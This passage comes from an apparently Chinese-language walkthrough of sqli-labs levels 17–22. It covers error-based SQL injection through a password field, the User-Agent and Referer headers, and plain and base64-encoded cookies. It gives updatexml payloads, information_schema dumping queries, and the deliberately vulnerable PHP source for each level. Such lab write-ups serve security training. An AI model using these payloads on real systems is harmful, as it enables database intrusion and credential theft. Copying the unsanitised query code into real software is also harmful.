	}

	// Quote if not a number
	if (!ctype_digit($value))
	{
		$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
	}
	else
	{
		$value = intval($value);
	}
	return $value;
}
```

但是我们可以看到密码的部分没有进行过滤操作

![image-20221018193555993](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221018193555993.png)

那么注入点就在passwd上，再继续审计代码发现需要输入正确的用户名 这里直接猜 ==admin==   (为什么猜这个？感觉。。。。。。)

然后输入万能密码，发现不反回内容，那么我们还是可以采用报错注入。如果前面的报错注入还没有理解的话，这里有个师傅的文章 看完大概就清楚了 [](https://blog.csdn.net/wangyuxiang946/article/details/123416521)

那么我们就来进行爆库操作

还是先判断注入点

<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221018194528203.png" alt="image-20221018194528203" style="zoom:67%;" />



<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221018194539428.png" alt="image-20221018194539428" style="zoom:67%;" />



代表找到了成功的注入点

**第二步、判断报错条件**

用户名输入：==admin==

密码输入：==a' and updatexml(1,0x7e,3) -- a==

<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221018194711016.png" alt="image-20221018194711016" style="zoom:67%;" />

页面显示报错函数的内容，确定报错注入可用。

**注意：**提示：==0x7e== 等价于 ==~==

**第三步、脱库**

获取当前使用的数据库，用户名输入：admin

密码输入：a' and updatexml(1,concat(0x7e,substr((database()),1,32)),3) -- +

这就爆出来了数据库名，接下来的操作，就是那些了。和前面提到的报错注入类似。



**常用的脱库语句**

```mysql
# 获取所有数据库
select group_concat(schema_name)
from information_schema.schemata
 
# 获取 security 库的所有表
select group_concat(table_name)
from information_schema.tables
where table_schema="security"
 
# 获取 users 表的所有字段
select group_concat(column_name)
from information_schema.columns
where table_schema="security" and table_name="users"
```

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
$a = 1;

function check_input($con1, $value)
{
	if(!empty($value))
	{
		// truncation (see comments)
		$value = substr($value,0,15);
	}

	// Stripslashes if magic quotes enabled
	if (get_magic_quotes_gpc())
	{
		$value = stripslashes($value);
	}

	// Quote if not a number
	if (!ctype_digit($value))
	{
		$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
	}
	else
	{
		$value = intval($value);
	}
	return $value;a
}

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
//making sure uname is not injectable
$uname=check_input($con1, $_POST['uname']);  

$passwd=$_POST['passwd'];


//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'User Name:'.$uname."\n");
fwrite($fp,'New Password:'.$passwd."\n");
fclose($fp);


// connectivity 
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";

$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);
//echo $row;
	if($row)
	{
  		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];  	
		//echo 'Your Login name:'. $row1;
		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
		mysqli_query($con1, $update);
		//echo $update;
  		echo "<br>";
	
	
	
		if (mysqli_error($con1))
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			print_r(mysqli_error($con1));
			echo "</br></br>";
			echo "</font>";
		}
		else
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			//echo " You password has been successfully updated " ;		
			echo "<br>";
			echo "</font>";
		}
	
		echo '<img src="../images/flag1.jpg"   />';	
		//echo 'Your Password:' .$row['password'];
  		echo "</font>";
	


  	}
	else  
	{
		echo '<font size="4.5" color="#FFFF00">';
		//echo "Bug off you Silly Dumb hacker";
		echo "</br>";
		echo '<img src="../images/slap1.jpg"   />';
	
		echo "</font>";  
	}
}

?>
```

### Less-18

这里需要注意的是后台对于密码和账户都进行了过滤。所以为我们需要转换注入点，尝试去请求头里修改信息。可以尝试 Cookie注入，UAz注入，refer字段注入。最后我们在 UA字段找到了注入点，输入单引号==‘==是会报错，然后我们采用的是报错注入。

BP抓包后，在User-Agent部分修改就可以了

依然可以使用报错注入

需要注意的是这一关，需要输入正确的账号和密码才可以进行注入。

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

function check_input($con1, $value)
{
	if(!empty($value))
	{
		// truncation (see comments)
		$value = substr($value,0,20);
	}

	// Stripslashes if magic quotes enabled
	if (get_magic_quotes_gpc())
	{
		$value = stripslashes($value);
	}

	// Quote if not a number
	if (!ctype_digit($value))
	{
		$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
	}
	else
	{
		$value = intval($value);
	}
	return $value;
}



$uagent = $_SERVER['HTTP_USER_AGENT'];
$IP = $_SERVER['REMOTE_ADDR'];
echo "<br>";
echo 'Your IP ADDRESS is: ' .$IP;
echo "<br>";
// echo 'Your User Agent is: ' .$uagent;
// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
	$uname = check_input($con1, $_POST['uname']);
	$passwd = check_input($con1, $_POST['passwd']);

	/*
	   echo 'Your Your User name:'. $uname;
	   echo "<br>";
	   echo 'Your Password:'. $passwd;
	   echo "<br>";
	   echo 'Your User Agent String:'. $uagent;
	   echo "<br>";
	   echo 'Your User Agent String:'. $IP;
	 */

	//logging the connection parameters to a file for analysis.	
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Agent:'.$uname."\n");

	fclose($fp);



	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysqli_query($con1, $sql);
	$row1 = mysqli_fetch_array($result1, MYSQLI_BOTH);
	if($row1)
	{
		echo '<font color= "#FFFF00" font size = 3 >';
		$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
		mysqli_query($con1, $insert);
		//echo 'Your IP ADDRESS is: ' .$IP;
		echo "</font>";
		//echo "<br>";
		echo '<font color= "#0000ff" font size = 3 >';			
		echo 'Your User Agent is: ' .$uagent;
		echo "</font>";
		echo "<br>";
		print_r(mysqli_error($con1));			
		echo "<br><br>";
		echo '<img src="../images/flag.jpg"  />';
		echo "<br>";

	}
	else
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysqli_error($con1));
		echo "</br>";			
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
	}

}

?>
```

### Less-19

**这一关与上一关基本一样，只是一个在 UA注入，一个 ReferJ进行注入**

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);

function check_input($con1, $value)
{
	if(!empty($value))
	{
		// truncation (see comments)
		$value = substr($value,0,20);
	}

	// Stripslashes if magic quotes enabled
	if (get_magic_quotes_gpc())
	{
		$value = stripslashes($value);
	}

	// Quote if not a number
	if (!ctype_digit($value))
	{
		$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
	}
	else
	{
		$value = intval($value);
	}
	return $value;
}



$uagent = $_SERVER['HTTP_REFERER'];
$IP = $_SERVER['REMOTE_ADDR'];
echo "<br>";
echo 'Your IP ADDRESS is: ' .$IP;
echo "<br>";
//echo 'Your User Agent is: ' .$uagent;
// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
	$uname = check_input($con1, $_POST['uname']);
	$passwd = check_input($con1, $_POST['passwd']);

	/*
	   echo 'Your Your User name:'. $uname;
	   echo "<br>";
	   echo 'Your Password:'. $passwd;
	   echo "<br>";
	   echo 'Your User Agent String:'. $uagent;
	   echo "<br>";
	   echo 'Your User Agent String:'. $IP;
	 */

	//logging the connection parameters to a file for analysis.	
	$fp=fopen('result.txt','a');
	fwrite($fp,'Referer:'.$uname."\n");

	fclose($fp);



	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysqli_query($con1, $sql);
	$row1 = mysqli_fetch_array($result1, MYSQLI_BOTH);
	if($row1)
	{
		echo '<font color= "#FFFF00" font size = 3 >';
		$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
		mysqli_query($con1, $insert);
		//echo 'Your IP ADDRESS is: ' .$IP;
		echo "</font>";
		//echo "<br>";
		echo '<font color= "#0000ff" font size = 3 >';			
		echo 'Your Referer is: ' .$uagent;
		echo "</font>";
		echo "<br>";
		print_r(mysqli_error($con1));			
		echo "<br><br>";
		echo '<img src="../images/flag.jpg" />';
		echo "<br>";

	}
	else
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysqli_error($con1));
		echo "</br>";			
		echo "</br>";
		echo '<img src="../images/slap.jpg"  />';	
		echo "</font>";  
	}

}

?>
```

### Less-20

**这一关中，是Cookie注入，是在Cookie的位置进行注入，可以用报错注入的方法进行**

还是要用burp进行抓包，然后发送到repeater

#### index源码

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
error_reporting(0);
if(!isset($_COOKIE['uname']))
{
	//including the Mysql connect parameters.
	include("../sql-connections/sqli-connect.php");

	echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
	echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
	echo "<div style='padding-top:10px; font-size:15px;'>";


	echo "<!--Form to post the contents -->";
	echo '<form action=" " name="form1" method="post">';

	echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
	echo '   <input type="text"  name="uname" value=""/>  </div>';

	echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
	echo '   <input type="text" name="passwd" value=""/></div></br>';	
	echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

	echo '</form>';
	echo '</div>';
	echo '</div>';
	echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
	echo '<font size="3" color="#FFFF00">';
	echo '<center><br><br><br>';
	echo '<img src="../images/Less-20.jpg" />';
	echo '</center>';





	function check_input($con1, $value)
	{
		if(!empty($value))
		{
			$value = substr($value,0,20); // truncation (see comments)
		}
		if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
		{
			$value = stripslashes($value);
		}
		if (!ctype_digit($value))   	// Quote if not a number
		{
			$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
		}
		else
		{
			$value = intval($value);
		}
		return $value;
	}



	echo "<br>";
	echo "<br>";

	if(isset($_POST['uname']) && isset($_POST['passwd']))
	{

		$uname = check_input($con1, $_POST['uname']);
		$passwd = check_input($con1, $_POST['passwd']);




		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
		$result1 = mysqli_query($con1, $sql);
		$row1 = mysqli_fetch_array($result1, MYSQLI_BOTH);
		$cookee = $row1['username'];
		if($row1)
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			setcookie('uname', $cookee, time()+3600);	
			header ('Location: index.php');
			echo "I LOVE YOU COOKIES";
			echo "</font>";
			echo '<font color= "#0000ff" font size = 3 >';			
			// echo 'Your Cookie is: ' .$cookee;
			echo "</font>";
			echo "<br>";
			print_r(mysqli_error($con1));			
			echo "<br><br>";
			echo '<img src="../images/flag.jpg" />';
			echo "<br>";
		}
		else
		{
			echo '<font color= "#0000ff" font size="3">';
			//echo "Try again looser";
			print_r(mysqli_error($con1));
			echo "</br>";			
			echo "</br>";
			echo '<img src="../images/slap.jpg" />';	
			echo "</font>";  
		}
	}

	echo "</font>";  
	echo '</font>';
	echo '</div>';

}
else
{



	if(!isset($_POST['submit']))
	{

		$cookee = $_COOKIE['uname'];
		$format = 'D d M Y - H:i:s';
		$timestamp = time() + 3600;
		echo "<center>";
		echo '<br><br><br>';
		echo '<img src="../images/Less-20.jpg" />';
		echo "<br><br><b>";
		echo '<br><font color= "red" font size="4">';	
		echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
		echo "</font><br>";	
		echo '<font color= "cyan" font size="4">';	
		echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
		echo "</font><br>";			
		echo '<font color= "#FFFF00" font size = 4 >';
		echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
		echo '<font color= "orange" font size = 5 >';			
		echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);


		echo "<br></font>";
		$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
		$result=mysqli_query($con1, $sql);
		if (!$result)
		{
			die('Issue with your mysql: ' . mysqli_error($con1));
		}
		$row = mysqli_fetch_array($result, MYSQLI_BOTH);
		if($row)
		{
			echo '<font color= "pink" font size="5">';	
			echo 'Your Login name:'. $row['username'];
			echo "<br>";
			echo '<font color= "grey" font size="5">';  	
			echo 'Your Password:' .$row['password'];
			echo "</font></b>";
			echo "<br>";
			echo 'Your ID:' .$row['id'];
		}
		else	
		{
			echo "<center>";
			echo '<br><br><br>';
			echo '<img src="../images/slap1.jpg" />';
			echo "<br><br><b>";
			//echo '<img src="../images/Less-20.jpg" />';
		}
		echo '<center>';
		echo '<form action="" method="post">';
		echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
		echo '</form>';
		echo '</center>';
	}	
	else
	{
		echo '<center>';
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo '<font color= "#FFFF00" font size = 6 >';
		echo " Your Cookie is deleted";
		setcookie('uname', $row1['username'], time()-3600);
		header ('Location: index.php');
		echo '</font></center></br>';

	}		


	echo "<br>";
	echo "<br>";
	//header ('Location: main.php');
	echo "<br>";
	echo "<br>";

	//echo '<img src="../images/slap.jpg" /></center>';
	//logging the connection parameters to a file for analysis.	
	$fp=fopen('result.txt','a');
	fwrite($fp,'Cookie:'.$cookee."\n");

	fclose($fp);

}
?>
```

### Less-21

**这一关与上一关基本一致，但是我们通过抓取数据包，会发现 cookie后面跟着的是一段编码，我们盲猜是base64编码，丢进工具**

**解码发现就是，可以使用bugku里面的工具**

然后我们将需要注入的语句，拿去进行base64加码，再粘贴在在后面就可以了。

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
if(!isset($_COOKIE['uname']))
{
	//including the Mysql connect parameters.
	include("../sql-connections/sqli-connect.php");

	echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
	echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
	echo "<div style='padding-top:10px; font-size:15px;'>";


	echo "<!--Form to post the contents -->";
	echo '<form action=" " name="form1" method="post">';

	echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
	echo '   <input type="text"  name="uname" value=""/>  </div>';

	echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
	echo '   <input type="text" name="passwd" value=""/></div></br>';	
	echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

	echo '</form>';
	echo '</div>';
	echo '</div>';
	echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
	echo '<font size="3" color="#FFFF00">';
	echo '<center><br><br><br>';
	echo '<img src="../images/Less-21.jpg" />';
	echo '</center>';






	function check_input($con1, $value)
	{
		if(!empty($value))
		{
			$value = substr($value,0,20); // truncation (see comments)
		}
		if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
		{
			$value = stripslashes($value);
		}
		if (!ctype_digit($value))   	// Quote if not a number
		{
			$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
		}
		else
		{
			$value = intval($value);
		}
		return $value;
	}



	echo "<br>";
	echo "<br>";

	if(isset($_POST['uname']) && isset($_POST['passwd']))
	{

		$uname = check_input($con1, $_POST['uname']);
		$passwd = check_input($con1, $_POST['passwd']);




		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
		$result1 = mysqli_query($con1, $sql);
		$row1 = mysqli_fetch_array($result1, MYSQLI_BOTH);
		if($row1)
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			setcookie('uname', base64_encode($row1['username']), time()+3600);	

			echo "I LOVE YOU COOKIES";
			echo "</font>";
			echo '<font color= "#0000ff" font size = 3 >';			
			//echo 'Your Cookie is: ' .$cookee;
			echo "</font>";
			echo "<br>";
			print_r(mysqli_error($con1));			
			echo "<br><br>";
			echo '<img src="../images/flag.jpg" />';
			echo "<br>";
			header ('Location: index.php');
		}
		else
		{
			echo '<font color= "#0000ff" font size="3">';
			//echo "Try again looser";
			print_r(mysqli_error($con1));
			echo "</br>";			
			echo "</br>";
			echo '<img src="../images/slap.jpg" />';	
			echo "</font>";  
		}
	}

	echo "</font>";  
	echo '</font>';
	echo '</div>';

}
else
{



	if(!isset($_POST['submit']))
	{
		$cookee = $_COOKIE['uname'];
		$format = 'D d M Y - H:i:s';
		$timestamp = time() + 3600;
		echo "<center>";
		echo "<br><br><br><b>";
		echo '<img src="../images/Less-21.jpg" />';
		echo "<br><br><b>";
		echo '<br><font color= "red" font size="4">';	
		echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
		echo "</font><br>";	
		echo '<font color= "cyan" font size="4">';	
		echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
		echo "</font><br>";			
		echo '<font color= "#FFFF00" font size = 4 >';
		echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
		echo '<font color= "orange" font size = 5 >';			
		echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);

		$cookee = base64_decode($cookee);
		echo "<br></font>";
		$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
		$result=mysqli_query($con1, $sql);
		if (!$result)
		{
			die('Issue with your mysql: ' . mysqli_error($con1));
		}
		$row = mysqli_fetch_array($result, MYSQLI_BOTH);
		if($row)
		{
			echo '<font color= "pink" font size="5">';	
			echo 'Your Login name:'. $row['username'];
			echo "<br>";
			echo '<font color= "grey" font size="5">';  	
			echo 'Your Password:' .$row['password'];
			echo "</font></b>";
			echo "<br>";
			echo 'Your ID:' .$row['id'];
		}
		else	
		{
			echo "<center>";
			echo '<br><br><br>';
			echo '<img src="../images/slap1.jpg" />';
			echo "<br><br><b>";
			//echo '<img src="../images/Less-20.jpg" />';
		}
		echo '<center>';
		echo '<form action="" method="post">';
		echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
		echo '</form>';
		echo '</center>';
	}	
	else
	{
		echo '<center>';
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo '<font color= "#FFFF00" font size = 6 >';
		echo " Your Cookie is deleted";
		setcookie('uname', base64_encode($row1['username']), time()-3600);
		header ('Location: index.php');
		echo '</font></center></br>';

	}		


	echo "<br>";
	echo "<br>";
	//header ('Location: main.php');
	echo "<br>";
	echo "<br>";

	//echo '<img src="../images/slap.jpg" /></center>';
	//logging the connection parameters to a file for analysis.	
	$fp=fopen('result.txt','a');
	fwrite($fp,'Cookie:'.$cookee."\n");

	fclose($fp);

}
?>
```

### Less-22

**第二十二关和第二十一关一样只不过cookie是双引号base64编码，没有括号。**

直接贴源码吧

#### index源码

**PHP部分**

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
if(!isset($_COOKIE['uname']))
{
	//including the Mysql connect parameters.
	include("../sql-connections/sqli-connect.php");

	echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
	echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
	echo "<div style='padding-top:10px; font-size:15px;'>";


	echo "<!--Form to post the contents -->";
	echo '<form action=" " name="form1" method="post">';

	echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
	echo '   <input type="text"  name="uname" value=""/>  </div>';

	echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
	echo '   <input type="text" name="passwd" value=""/></div></br>';	
	echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

	echo '</form>';
	echo '</div>';
	echo '</div>';
	echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
	echo '<font size="3" color="#FFFF00">';
	echo '<center><br><br><br>';
	echo '<img src="../images/Less-22.jpg" />';
	echo '</center>';







	function check_input($con1, $value)
	{
		if(!empty($value))
		{
			$value = substr($value,0,20); // truncation (see comments)
		}
		if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
		{
			$value = stripslashes($value);
		}
		if (!ctype_digit($value))   	// Quote if not a number
		{
			$value = "'" . mysqli_real_escape_string($con1, $value) . "'";
		}
		else
		{
			$value = intval($value);
		}
		return $value;
	}



	echo "<br>";
	echo "<br>";

	if(isset($_POST['uname']) && isset($_POST['passwd']))
	{

		$uname = check_input($con1, $_POST['uname']);
		$passwd = check_input($con1, $_POST['passwd']);




		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
		$result1 = mysqli_query($con1, $sql);
		$row1 = mysqli_fetch_array($result1, MYSQLI_BOTH);
		if($row1)
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			setcookie('uname', base64_encode($row1['username']), time()+3600);	
			header ('Location: index.php');
			echo "I LOVE YOU COOKIES";
			echo "</font>";
			echo '<font color= "#0000ff" font size = 3 >';			
			//echo 'Your Cookie is: ' .$cookee;
			echo "</font>";
			echo "<br>";
			print_r(mysqli_error($con1));			
			echo "<br><br>";
			echo '<img src="../images/flag.jpg" />';
			echo "<br>";
		}
		else
		{
			echo '<font color= "#0000ff" font size="3">';
			//echo "Try again looser";
			print_r(mysqli_error($con1));
			echo "</br>";			
			echo "</br>";
			echo '<img src="../images/slap.jpg" />';	
			echo "</font>";  
		}
	}

	echo "</font>";  
	echo '</font>';
	echo '</div>';

}
else
{



	if(!isset($_POST['submit']))
	{
		$cookee = $_COOKIE['uname'];
		$format = 'D d M Y - H:i:s';
		$timestamp = time() + 3600;
		echo "<center>";
		echo "<br><br><br><b>";
		echo '<img src="../images/Less-21.jpg" />';
		echo "<br><br><b>";
		echo '<br><font color= "red" font size="4">';	
		echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
		echo "</font><br>";	
		echo '<font color= "cyan" font size="4">';	
		echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
		echo "</font><br>";			
		echo '<font color= "#FFFF00" font size = 4 >';
		echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
		echo '<font color= "orange" font size = 5 >';			
		echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);

		$cookee = base64_decode($cookee);
		$cookee1 = '"'. $cookee. '"';
		echo "<br></font>";
		$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
		$result=mysqli_query($con1, $sql);
		if (!$result)
		{
			die('Issue with your mysql: ' . mysqli_error($con1));
		}
		$row = mysqli_fetch_array($result, MYSQLI_BOTH);
		if($row)
		{
			echo '<font color= "pink" font size="5">';	
			echo 'Your Login name:'. $row['username'];
			echo "<br>";
			echo '<font color= "grey" font size="5">';  	
			echo 'Your Password:' .$row['password'];
			echo "</font></b>";
			echo "<br>";
			echo 'Your ID:' .$row['id'];
		}
		else	
		{
			echo "<center>";
			echo '<br><br><br>';
			echo '<img src="../images/slap1.jpg" />';
			echo "<br><br><b>";
			//echo '<img src="../images/Less-20.jpg" />';
		}
		echo '<center>';
		echo '<form action="" method="post">';
		echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
		echo '</form>';
		echo '</center>';
	}	
	else
	{
		echo '<center>';
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo '<font color= "#FFFF00" font size = 6 >';
		echo " Your Cookie is deleted";
		setcookie('uname', base64_encode($row1['username']), time()-3600);
		header ('Location: index.php');
		echo '</font></center></br>';

	}		


	echo "<br>";
	echo "<br>";
	//header ('Location: main.php');
	echo "<br>";
	echo "<br>";

	//echo '<img src="../images/slap.jpg" /></center>';
	//logging the connection parameters to a file for analysis.	
	$fp=fopen('result.txt','a');
	fwrite($fp,'Cookie:'.$cookee."\n");

	fclose($fp);

}
?>
```





